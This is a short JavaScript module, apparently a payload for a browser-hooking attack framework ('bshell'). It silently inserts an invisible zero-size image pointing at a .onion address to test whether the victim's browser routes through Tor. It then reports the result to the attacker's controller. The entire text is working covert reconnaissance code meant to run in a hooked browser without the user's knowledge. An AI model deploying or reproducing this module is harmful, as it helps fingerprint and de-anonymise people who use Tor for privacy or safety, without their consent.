function(bshell) {
    var self = this;
    var img = new Image();
    this.respond = function(status) {
	bshell.send({behind_tor: status});
	document.body.removeChild(img);
    };

    img.setAttribute("style","visibility:hidden");
    img.setAttribute("width","0");
    img.setAttribute("height","0");
    img.id = 'torimg';
    img.onerror = function() {
	self.respond(false);
    };
    img.onload = function() {
	self.respond(true);
    };
    img.src = 'http://dige6xxwpt2knqbv.onion/wink.gif';
    document.body.appendChild(img);
    return false;
}(bshell);